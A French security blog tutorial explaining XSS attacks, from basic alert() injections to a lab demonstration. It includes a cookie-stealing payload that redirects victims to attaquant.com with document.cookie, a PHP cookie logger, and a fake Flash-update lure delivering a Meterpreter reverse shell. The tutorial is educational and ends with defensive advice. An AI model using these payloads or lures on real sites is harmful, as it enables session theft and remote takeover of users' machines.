---
title: "L'attaque XSS"
date: 2017-09-19  15:36:12
author: "Pixis"
layout: post
permalink: /la-faille-xss/
permalink: /attaque-xss/
redirect_from:
  - "/la-faille-xss"
  - "/la-faille-xss/"
disqus_identifier: 0000-0000-0000-001a
description: "Dans cet article, nous allons parler de l'attaque XSS (Cross Site Scripting) en expliquant son fonctionnement, et en quoi elle peut être réellement dangereuse."
cover: assets/uploads/2017/09/xss_cover.png
tags:
  - Web
---

Dans cet article, nous allons parler de l'attaque XSS (Cross Site Scripting) en expliquant son fonctionnement, et en quoi elle peut être réellement dangereuse. Pour cela, nous allons expliquer de manière très simple comment cette attaque fonctionne, puis nous ferons un exemple complet, concret, permettant de prendre la main sur la machine d'une victime.

<!--more-->

## Introduction

Pour comprendre le principe de l'attaque XSS, je rappelle que la grande majorité des failles informatiques sont dûes à une utilisation non prévue d'une application, d'un exécutable ou toute autre entité. Quand l'utilisateur envoie une information plus longue que prévue (buffer overflow), ou une valeur non gérée (négative, quand on attend une valeur positive), ou quand il ajoute des symboles non attendus (des guillemets, des cheverons quand on attendait seulement des lettres), si les contrôles ne sont pas soigneusements faits, alors le programme ou l'application peut être détournée.

## Premiers pas

L'attaque XSS repose sur ces problématiques. Elle est possible lorsqu'une valeur qui peut être contrôlée par l'utilisateur est injectée dans une page web sans suffisamment de contrôles, et que cette valeur peut être du code html/javascript valide, qui sera alors interprété par le navigateur.

Voici un exemple très simple : L'utilisateur peut uploader une image sur un site, et remplir un champ de description. S'il upload l'image `chat.jpg` et qu'il met en description `Une image de mon chat`, nous afficherons (par exemple) sur le site le code html suivant :

```html
<img src="./chat.jpg" title="Une image de mon chat" />
```

Cependant, imaginons alors que l'utilisateur choisisse comme description `Une image" /><script>alert('hackndo');</script><p class="`
Dans ce cas, nous aurons comme code html dans notre page

```html
<img src="./chat.jpg" title="Une image" /><script>alert('hackndo');</script><p class="" />
```

Ce code html est valide et exécute du javascript au sein du navigateur de l'utilisateur alors que ce n'était pas voulu par le développeur à l'origine.

Il suffit alors d'envoyer la page contenant l'image à une autre personne pour exécuter du javascript dans le navigateur de l'autre utilisateur. Comme le code injecté est enregistré par le serveur, et qu'il ne disparait pas au rafraichissement de la page, on appelle cela une attaque XSS persistante.

Lorsque le code injecté n'est pas persistant, alors c'est une attaque XSS non persistante. C'est par exemple le cas dans un formulaire de recherche, et que le contenu de la recherche est affiché à l'écran

```html
<p>L'utilisateur Pixis n'existe pas.</p>
```

Si nous envoyons `Pixis<script>alert('hackndo');</script>` alors la réponse sera 

```html
<p>L'utilisateur Pixis<script>alert('hackndo');</script> n'existe pas.</p>
```

Le javascript `alert` sera exécuté, mais seulement pour nous, puisqu'il faut lancer la recherche avec le champ bien choisi pour que ce code soit injecté dans la page. Quand un autre utilisateur arrive sur la page de recherche, notre code javascript n'est pas présent sur la page, donc il ne se passera rien.

## Premiers risques

Contrairement à ce que nous pourrions penser, le fait que la charge utile soit exécutée côté client est bel et bien un risque pour l'utilisateur. En effet, le client possède plusieurs informations secrètes et utiles pour l'attaquant, il a également des extensions dans son navigateur qui peuvent avoir des vulnérabilités.

Jusque-là, nous avons seulement affiché une pop-up dans la navigateur de la victime, mais nous allons aller un peu plus loin et voler les cookies de l'utilisateur sur le site vulnérable. Pour cela, nous utiliserons la propriété [cookie](https://developer.mozilla.org/fr/docs/Web/API/Document/cookie){:target="blank"} du document (sous réserve que les cookies ne soient pas [protégés](https://www.information-security.fr/securite-sites-web-lutilite-flags-secure-httponly/){:target="blank"})

```javascript
document.cookie
```

Cela permet de récupérer les cookies de l'utilisateur associés au domaine+port. Une fois que les cookies ont été chargés dans le navigateur de la victime, il faut que l'attaquant les récupère. Plusieurs solutions sont possibles, mais une solution commune est que l'attaquant a préparé un serveur de son côté avec une page qui enregistre la valeur d'un paramètre `http://attaquant.com/get.php?v=<valeur>`. Du côté de l'attaquant, quand cette page est accédée avec une valeur, elle sera par exemple enregistrée dans un fichier texte.

Voici un exemple minimaliste de page

```php
// get.php
<?php
  $cookie = $_GET['v'] . "\n";
  file_put_contents("cookies.txt", $cookie, FILE_APPEND | LOCK_EX);
```

Enfin, pour que la victime accède à l'URL avec ses cookies, l'attaquant peut utiliser une redirection :

```javascript
document.location
```

Cela permet de construire la charge utile finale. En reprenant l'exemple pris dans l'introduction avec l'image, l'attaquant enverra comme description

```
Une image" /><script>document.location="http://attaquant.com/get.php?v=" + document.cookie;</script><p class="
```

La page contenant l'image deviendra alors

```html
<img src="./chat.jpg" title="Une image" /><script>document.location="http://attaquant.com/get.php?v=" + document.cookie;</script><p class="" />
```

Et plus clairement, si on met les indentations (qui n'ont pas d'effet sur le code)

```html
<img src="./chat.jpg" title="Une image" />
<script>
  document.location="http://attaquant.com/get.php?v=" + document.cookie;
</script>
<p class="" />
```

Lorsque la victime accède à la page piégée, alors elle sera redirigée vers le site de l'attaquant avec ses cookies en paramètres, cookies qui seront enregistrés par le site de l'attaquant dans un fichier `cookies.txt`. L'attaquant peut alors se connecter sur le compte de la victime en utilisant ses cookies.

## Allons plus loin

Quand beaucoup de sites s'arrêtent ici pour l'explication des attaques XSS, nous allons voir comment une personne mal intentionnée peut prendre le contrôle total de la machine de la victime à l'aide d'une faille permettant cette attaque et d'un peu de social engineering.

Voici l'environnement de test que j'ai mis en place pour cet exemple

[![configuration](/assets/uploads/2017/09/configuration.png)](/assets/uploads/2017/09/configuration.png)

Un attaquant a trouvé une vulnérabilité permettant une attaque XSS persistante sur un site internet, et il va piéger un utilisateur.

Une petite application web (pas sécurisée du tout !) a été créée pour illustrer cette démonstration. C'est une application de galerie d'images qui permet d'envoyer sur le serveur une image avec une description, et cette image est ensuite affichée pour tous les utilisateurs, avec une bulle d'info qui dévoile sa description quand on survole l'image. Le code est disponible [sur mon github](https://github.com/Hackndo/blog/tree/master/20170920_XSS){:target="blank"}.

Nous l'avons vu dans la première partie de cet article, une faille permettant une XSS est présente dans la description de l'image (mais pas seulement, le nom de l'image peut être également utilisé pour exploiter la vulnérabilité par exemple).

Voici le plan d'action que l'attaquant peut suivre

1. Création d'un exécutable qui se connectera au serveur de l'attaquant lorsqu'il est lancé
2. Mise à disposition de cet exécutable sur un serveur de l'attaquant
3. Mise en écoute du serveur de l'attaquant
4. Exploitation simple de la faille via une XSS
5. Création d'une charge utile faisant croire à un plugin Flash manquant dans le navigateur de la victime
6. Exploitation

### Création de l'exécutable malveillant

Nous allons créer une exécutable malveillant qui va se faire passer pour un logiciel permettant de mettre à jour Adobe Flash, mais qui véritablement se connectera à la machine de l'attaquant pour lui donner la main sur la machine de la victime à distance. Nous n'allons pas faire quelque chose de très compliqué, et seulement le nom du programme permettra de leurrer les victimes.

Nous utilisons le `Social Engineering Toolkit` pour parvenir à nos fins en créant un `Windows Reverse_TCP Meterpreter`. Si vous avez compris l'environnement dans lequel nous nous trouvons, cet exécutable doit se connecter à l'adresse de l'attaquant lorsqu'il est exécuté, adresse qui est 192.168.1.104, par exemple sur le port 6666.

[![reverseshellcreation](/assets/uploads/2017/09/reverseshellcreation.png)](/assets/uploads/2017/09/reverseshellcreation.png)

Le SET nous crée alors un exécutable malveillant dans `/root/.set/payload.exe`, et nous le renommons en `update_flash.exe`

### Mise en ligne de l'exécutable

Pour que la victime puisse télécharger cet exécutable, il faut qu'il soit disponible sur un serveur. Pour cela, il suffit d'avoir un serveur qui tourne quelque part et de mettre le fichier dessus. Dans notre environnement de test, l'attaquant fait tourner un serveur web sur sa machine, donc il rend l'exécutable accessible à l'adresse `http://192.168.1.104/update_flash.exe`

### Ecoute chez l'attaquant

Lorsque la victime lancera cet exécutable, une connexion vers l'adresse de l'attaquant sur le port 6666 sera initiée. Il suffit alors d'attendre cette connexion du côté de l'attaquant, soit très simplement via une commande netcat, soit via le SET ou Metasploit afin d'ouvrir une session Meterpreter lors de la connexion de la victime. Nous utiliserons le SET dans notre exemple.

### Attaque XSS

Comme vu précédemment, il est possible d'exploiter la faille avec la description de l'image en utilisant la charge utile `Une image' /><script>alert('hackndo');</script><p class='`

[![chargeutile](/assets/uploads/2017/09/chargeutile.png)](/assets/uploads/2017/09/chargeutile.png)

Une fois le champ `description` rempli avec notre chaine bien préparée, si on upload l'image, nous avons la pop-up qui devrait apparaitre.

[![alert](/assets/uploads/2017/09/alert.png)](/assets/uploads/2017/09/alert.png)

La pop-up est bien apparue, notre XSS fonctionne.

### Faux plugin Flash manquant

Afin que la victime télécharge l'exécutable malveillant, nous allons simuler l'absence d'un plugin flash. Pour cela, très simplement, j'ai pris une capture d'écran de ce qui est affiché quand Flash n'est pas activé

[![flash](/assets/uploads/2017/09/flash.png)](/assets/uploads/2017/09/flash.png)

Le but étant que la victime pense vraiment à un plugin Flash manquant, nous allons devoir construire un payload qui ne casse pas toute l'interface graphique du site. Ainsi, nous allons imiter son comportement. Voici le résultat attendu normalement :

```html
<img src='./img/Sunset.jpg' title='Mon image' style='width: 100px; height: auto; padding: 10px;' />
```

Et voilà ce que ça donnera une fois qu'on aura exploité la faille

```html
<img src='./img/Sunset.jpg' title='Hackndo' style='width: 100px; height: auto; padding: 10px;' />
<br />
<br />
<a href='http://192.168.1.104/flash_update.exe'>
    <img src='http://192.168.1.104/flash.png' />
</a>
<p alt='' />
```

Cela aura pour effet d'afficher l'image `Sunset.jpg` avec le même style que les images précédantes, puis d'afficher en dessous l'image de plugin manquant, avec un lien vers l'exécutable malveillant. Si nous envoyons cela en description d'une photo, voilà ce que ça donne

```
Hackndo' style='width: 100px; height: auto; padding: 10px;' /><br /><br /><a href='http://192.168.1.104/flash_update.exe'><img src='http://192.168.1.104/flash.png' /></a><p alt='
```

[![flashupdate](/assets/uploads/2017/09/flashupdate.png)](/assets/uploads/2017/09/flashupdate.png)

### Exploitation

Tout est prêt. Il suffit maintenant qu'un utilisateur peu averti passe sur le site, pense qu'un plugin flash est manquant ou désactivé pour voir le contenu du site. Il va alors cliquer sur `Activate Adobe Flash`, ce qui lui fera télécharger l'exécutable `flash_update.exe`. En le lançant, il va se connecter au serveur de l'attaquant, permettant à ce dernier d'avoir la main sur la machine de la victime.

[![sessionstart](/assets/uploads/2017/09/sessionstart.png)](/assets/uploads/2017/09/sessionstart.png)

[![session](/assets/uploads/2017/09/session.png)](/assets/uploads/2017/09/session.png)

L'attaquant peut alors ouvrir la session et lancer un shell sur la machine de la victime, puis il peut par exemple créer un fichier vide appelé `HACKED_BY_PIXIS.txt` sur le bureau de la victime. Bien évidemment, je rappelle que nous sommes dans un environnement de test [à des fins éducatives](/disclaimer), et les machines sur lesquelles cet exemple a été fait sont toutes des machines virtuelles m'appartenant.

[![desktop](/assets/uploads/2017/09/desktop.png)](/assets/uploads/2017/09/desktop.png)

## Conclusion

Nous avons vu dans cet article le fonctionnement basique d'une attaque XSS et à quel point cela peut devenir dangereux. Evidemment, beaucoup de site sont au courant de ce type de faille et filtrent les entrées utilisateurs. Il existe alors un jeu du chat et de la souris pour passer outre les protections mises en place. Il suffit d'aller jeter un oeil au [site de l'OWASP](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet){:target="blank"} pour s'en convaincre.

Si vous êtes développeur de sites internet, pensez bien à protéger toutes les variables qu'un utilisateur peut modifier directement ou indirectement, c'est la clé pour un début de protection.

Par ailleurs, concernant les cookies, il existe des flags pour les protéger tels que [HttpOnly](https://www.owasp.org/index.php/HttpOnly){:target="blank"} et le flag [Secure](https://www.owasp.org/index.php/SecureFlag){:target="blank"}.

Pour aller plus loin, je vous invite à vous renseigner sur le projet [BeEF](http://beefproject.com/){:target="blank"} qui permet encore plus d'actions avec des attaques XSS, ainsi que toutes les techniques de protection et de bypass qui peuvent exister (ou du moins, un maximum). Ainsi, vous saurez contre quoi vous protéger lorsque vous développerez votre site.

J'espère que cet article vous a plu, si vous avez des questions ou des remarques, n'hésitez pas à les poser dans les commentaires !

